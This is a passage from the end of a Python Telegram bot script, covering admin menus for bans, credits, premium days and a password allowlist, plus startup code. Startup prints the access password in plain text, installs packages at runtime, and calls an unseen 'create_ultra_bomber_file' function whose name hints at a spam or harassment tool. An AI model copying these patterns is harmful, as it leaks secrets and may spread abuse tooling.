        types.InlineKeyboardButton("✅ Unban", callback_data="um_unban")
    )
    mk.add(
        types.InlineKeyboardButton("👤 Info", callback_data="um_info"),
        types.InlineKeyboardButton("💰 Credits", callback_data="um_credits")
    )
    mk.add(
        types.InlineKeyboardButton("👑 Premium", callback_data="um_premium"),
        types.InlineKeyboardButton("📊 Ref Stats", callback_data="um_refstats")
    )
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text("👤 <b>User Management</b>\n\nSelect option:", c.message.chat.id, c.message.message_id, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("um_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def user_management_actions(c):
    uid = c.from_user.id
    action = c.data[3:]
    
    if action == "ban":
        action_sessions[uid] = "ban_user"
        bot.send_message(c.message.chat.id, "🚫 Enter User ID to ban:")
    elif action == "unban":
        action_sessions[uid] = "unban_user"
        bot.send_message(c.message.chat.id, "✅ Enter User ID to unban:")
    elif action == "info":
        action_sessions[uid] = "user_info"
        bot.send_message(c.message.chat.id, "👤 Enter User ID:")
    elif action == "credits":
        action_sessions[uid] = "adjust_credits"
        bot.send_message(c.message.chat.id, "💰 Format: user_id amount")
    elif action == "premium":
        action_sessions[uid] = "add_premium"
        bot.send_message(c.message.chat.id, "👑 Format: user_id days")
    elif action == "refstats":
        show_referral_stats(c.message)
    elif action == "back":
        bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) in ["ban_user", "unban_user", "user_info", "adjust_credits", "add_premium"] and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def process_admin_actions(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    text = m.text.strip()
    
    try:
        if action == "ban_user":
            if not text.isdigit():
                bot.reply_to(m, "❌ Invalid ID")
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(text)
            ban_expiry = datetime.now() + timedelta(minutes=30)
            ban_reason = "Admin ban"
            
            bans_db[str(target_id)] = {'expiry': ban_expiry.isoformat(), 'reason': ban_reason}
            save_database(BANS_DB_FILE, bans_db)
            
            try:
                bot.send_message(target_id, f"🚫 <b>BANNED</b>\n\nDuration: 30 min\nReason: {ban_reason}\nUntil: {ban_expiry.strftime('%Y-%m-%d %H:%M')}\nContact: {OWNER_USERNAME}", parse_mode='HTML')
            except:
                pass
            
            bot.reply_to(m, f"✅ User {target_id} banned 30 min")
            log_to_group(f"🚫 BAN\n👤 {target_id}\n👑 {m.from_user.first_name}")
        
        elif action == "unban_user":
            if not text.isdigit():
                bot.reply_to(m, "❌ Invalid ID")
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(text)
            
            if str(target_id) in bans_db:
                del bans_db[str(target_id)]
                save_database(BANS_DB_FILE, bans_db)
            
            try:
                bot.send_message(target_id, "✅ Your ban has been lifted!", parse_mode='HTML')
            except:
                pass
            
            bot.reply_to(m, f"✅ User {target_id} unbanned")
            log_to_group(f"✅ UNBAN\n👤 {target_id}\n👑 {m.from_user.first_name}")
        
        elif action == "user_info":
            if not text.isdigit():
                bot.reply_to(m, "❌ Invalid ID")
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(text)
            user_info = users_db.get(str(target_id), {})
            premium = is_premium(target_id)
            banned = str(target_id) in bans_db
            
            username = user_info.get('username', 'N/A')
            first_name = user_info.get('first_name', 'N/A')
            joined_date = user_info.get('joined_date', 'N/A')
            credits = user_info.get('credits', 0)
            referrals = user_info.get('total_referrals', 0)
            points = user_info.get('referral_points', 0)
            
            premium_status = "✅ Premium" if premium else "❌ Free"
            ban_status = "✅ Not banned"
            if banned:
                ban_data = bans_db[str(target_id)]
                ban_expiry = datetime.fromisoformat(ban_data['expiry'])
                if ban_expiry > datetime.now():
                    ban_status = f"🚫 Banned until {ban_expiry.strftime('%Y-%m-%d %H:%M')}"
            
            info_text = (
                f"👤 <b>USER INFO</b>\n"
                f"══════════════════════════════\n\n"
                f"🆔 <b>ID:</b> {target_id}\n"
                f"👤 <b>Username:</b> @{username}\n"
                f"📛 <b>Name:</b> {first_name}\n"
                f"📅 <b>Joined:</b> {joined_date}\n\n"
                f"📊 <b>Status</b>\n{premium_status}\n{ban_status}\n\n"
                f"💰 <b>Credits:</b> {credits}\n"
                f"🤝 <b>Referrals:</b> {referrals}\n"
                f"⭐ <b>Points:</b> {points}"
            )
            
            bot.reply_to(m, info_text, parse_mode='HTML')
        
        elif action == "adjust_credits":
            parts = text.split()
            if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
                bot.reply_to(m, "❌ Format: user_id amount")
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(parts[0])
            amount = int(parts[1])
            
            target_str = str(target_id)
            if target_str not in users_db:
                users_db[target_str] = {'user_id': target_id, 'credits': amount, 'referral_points': 0, 'total_referrals': 0}
            else:
                users_db[target_str]['credits'] = users_db[target_str].get('credits', 0) + amount
            
            save_database(USERS_DB_FILE, users_db)
            new_balance = users_db[target_str]['credits']
            
            bot.reply_to(m, f"✅ <b>Credits Adjusted!</b>\n\n👤 {target_id}\n💰 {amount:+}\n📊 New: {new_balance}", parse_mode='HTML')
            log_to_group(f"💰 CREDITS\n👤 {target_id}\n💰 {amount:+}\n👑 {m.from_user.first_name}")
        
        elif action == "add_premium":
            parts = text.split()
            if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
                bot.reply_to(m, "❌ Format: user_id days")
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(parts[0])
            days = int(parts[1])
            
            expiry = (datetime.now() + timedelta(days=days)).isoformat()
            subs_db[str(target_id)] = {'expiry': expiry}
            save_database(SUBS_DB_FILE, subs_db)
            
            bot.reply_to(m, f"✅ <b>Premium Added!</b>\n\n👤 {target_id}\n⏰ {days} days\n📅 Expires: {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}", parse_mode='HTML')
            
            try:
                bot.send_message(target_id, f"🎉 <b>PREMIUM ACTIVATED!</b>\n\nDuration: {days} days\nExpires: {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}", parse_mode='HTML')
            except:
                pass
            
            log_to_group(f"👑 PREMIUM\n👤 {target_id}\n⏰ {days} days\n👑 {m.from_user.first_name}")
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}", parse_mode='HTML')
    
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

def show_referral_stats(m):
    top_referrers = []
    for user_id_str, user_data in users_db.items():
        if user_data.get('referral_points', 0) > 0:
            top_referrers.append((int(user_id_str), user_data))
    
    top_referrers.sort(key=lambda x: x[1].get('referral_points', 0), reverse=True)
    top_referrers = top_referrers[:10]
    
    total_users = len(users_db)
    total_points = sum(user.get('referral_points', 0) for user in users_db.values())
    total_referrals = sum(user.get('total_referrals', 0) for user in users_db.values())
    
    response = "📊 <b>REFERRAL STATS</b>\n\n"
    response += f"👥 <b>Total Users:</b> {total_users}\n"
    response += f"⭐ <b>Total Points:</b> {total_points}\n"
    response += f"🤝 <b>Total Referrals:</b> {total_referrals}\n\n"
    
    if top_referrers:
        response += "<b>🏆 Top Referrers:</b>\n"
        for i, (user_id, user_data) in enumerate(top_referrers, 1):
            username = user_data.get('username', f'ID:{user_id}')
            points = user_data.get('referral_points', 0)
            referrals = user_data.get('total_referrals', 0)
            response += f"{i}. {username} - {points} pts ({referrals} refs)\n"
    
    bot.reply_to(m, response, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_auth_users" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def auth_users_menu(c):
    auth_users = load_database(AUTH_USERS_FILE, [])
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(types.InlineKeyboardButton("📋 List Auth Users", callback_data="auth_list"))
    mk.add(types.InlineKeyboardButton("➕ Add User", callback_data="auth_add"))
    mk.add(types.InlineKeyboardButton("➖ Remove User", callback_data="auth_remove"))
    mk.add(types.InlineKeyboardButton("🗑 Clear All", callback_data="auth_clear_all"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text(
        f"🔐 <b>AUTHENTICATED USERS</b>\n\nTotal: {len(auth_users)} users\n\nSelect option:",
        c.message.chat.id, c.message.message_id,
        reply_markup=mk, parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("auth_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def auth_users_handler(c):
    action = c.data[5:]
    auth_users = load_database(AUTH_USERS_FILE, [])
    
    if action == "list":
        if not auth_users:
            bot.answer_callback_query(c.id, "📭 No authenticated users", show_alert=True)
            return
        
        response = "🔐 <b>AUTHENTICATED USERS</b>\n\n"
        for uid_str in auth_users[:20]:
            user_info = users_db.get(uid_str, {})
            username = user_info.get('username', 'N/A')
            response += f"• @{username} (ID: {uid_str})\n"
        
        if len(auth_users) > 20:
            response += f"\n... and {len(auth_users) - 20} more"
        
        bot.send_message(c.message.chat.id, response, parse_mode='HTML')
        bot.answer_callback_query(c.id)
    
    elif action == "clear_all":
        save_database(AUTH_USERS_FILE, [])
        AUTHORIZED_USERS.clear()
        bot.answer_callback_query(c.id, "🗑 All auth users cleared!")
        bot.send_message(c.message.chat.id, "✅ All authenticated users cleared. Users will need to enter password again.", parse_mode='HTML')
        log_to_group(f"🔐 ALL AUTH USERS CLEARED\n👑 {c.from_user.first_name}")
    
    elif action == "add":
        action_sessions[c.from_user.id] = "auth_add_user"
        bot.send_message(c.message.chat.id, "🔐 Enter User ID to add to auth list:")
    
    elif action == "remove":
        action_sessions[c.from_user.id] = "auth_remove_user"
        bot.send_message(c.message.chat.id, "🔐 Enter User ID to remove from auth list:")

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) in ["auth_add_user", "auth_remove_user"] and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def auth_user_process(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    text = m.text.strip()
    
    if not text.isdigit():
        bot.reply_to(m, "❌ Invalid User ID")
        if uid in action_sessions:
            del action_sessions[uid]
        return
    
    target_id = text
    auth_users = load_database(AUTH_USERS_FILE, [])
    
    if action == "auth_add_user":
        if target_id not in auth_users:
            auth_users.append(target_id)
            save_database(AUTH_USERS_FILE, auth_users)
            AUTHORIZED_USERS.add(int(target_id))
        bot.reply_to(m, f"✅ User {target_id} added to auth list")
        log_to_group(f"🔐 AUTH USER ADDED\n👤 {target_id}\n👑 {m.from_user.first_name}")
    
    elif action == "auth_remove_user":
        if target_id in auth_users:
            auth_users.remove(target_id)
            save_database(AUTH_USERS_FILE, auth_users)
            AUTHORIZED_USERS.discard(int(target_id))
        bot.reply_to(m, f"✅ User {target_id} removed from auth list")
        log_to_group(f"🔐 AUTH USER REMOVED\n👤 {target_id}\n👑 {m.from_user.first_name}")
    
    if uid in action_sessions:
        del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_back" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def owner_back(c):
    owner_panel(c.message)

# ==========================================
# 🚀 START BOT
# ==========================================
if __name__ == "__main__":
    print("✨ KING MASTER BOT V23 STARTED ✨")
    print(f"🤖 Bot: {BOT_USERNAME}")
    print(f"👑 Owner: {OWNER_USERNAME}")
    print(f"🔑 Admin ID: {ADMIN_ID}")
    print(f"🔐 Current Password: {'*' * len(BOT_PASSWORD)} ({len(BOT_PASSWORD)} chars)")
    print(f"🔴 Bot Status: {'🟢 ONLINE' if BOT_ENABLED else '🔴 OFFLINE'}")
    print("═" * 50)
    
    try:
        bot.remove_webhook()
        time.sleep(1)
        print("✅ Webhook removed")
    except:
        print("✅ No webhook found")
    
    required_modules = ['paramiko', 'psutil', 'instaloader', 'aiohttp', 'colorama', 'beautifulsoup4']
    for module in required_modules:
        try:
            __import__(module)
            print(f"✅ {module} installed")
        except ImportError:
            print(f"⚠️ Installing {module}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', module], capture_output=True)
    
    global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
    if os.path.exists(global_req_path):
        with open(global_req_path, 'r') as f:
            module_count = len([line for line in f if line.strip()])
        print(f"📦 Global requirements: {module_count} modules")
    else:
        with open(global_req_path, 'w') as f:
            f.write("requests\ntelebot\nparamiko\npsutil\ninstaloader\naiohttp\ncolorama\nbeautifulsoup4\n")
        print("✅ Created default requirements")
    
    public_count = get_channel_count_by_type("public")
    private_count = get_channel_count_by_type("private")
    print(f"📢 Force Channels: {public_count + private_count}")
    print(f"   • Public: {public_count}/{MAX_PUBLIC_CHANNELS}")
    print(f"   • Private: {private_count}/{MAX_PRIVATE_CHANNELS}")
    
    enabled_features = sum(1 for feature, enabled in settings_db.get('feature_flags', {}).items() if enabled)
    total_features = len(settings_db.get('feature_flags', {}))
    print(f"🔧 Features: {enabled_features}/{total_features} enabled")
    
    auth_count = len(load_database(AUTH_USERS_FILE, []))
    print(f"🔐 Authenticated Users: {auth_count}")
    
    print("═" * 50)
    print("🎁 Referral Rewards:")
    for threshold, reward in REFERRAL_REWARDS.items():
        print(f"   • {threshold} pts → {reward['name']}")
    
    print("═" * 50)
    print("🔐 Password Protection Enabled")
    print(f"   Current Password: {BOT_PASSWORD}")
    print("   Users must enter password to use bot")
    print("   Authenticated users persist in database")
    print("   🔑 Owner can change password anytime via Owner Panel")
    print("   🔴 Owner can turn bot ON/OFF via Owner Panel")
    
    print("═" * 50)
    print("🤖 Starting bot...")
    
    def auto_save():
        while True:
            time.sleep(300)
            try:
                save_all_databases()
                print("💾 Auto-saved")
            except:
                pass
    
    threading.Thread(target=auto_save, daemon=True).start()
    create_ultra_bomber_file()
    
    try:
        print("🔄 Polling started...")
        bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"❌ Crashed: {e}")
        print("🔄 Restarting in 10s...")
        time.sleep(10)
        os.execv(sys.executable, [sys.executable] + sys.argv)
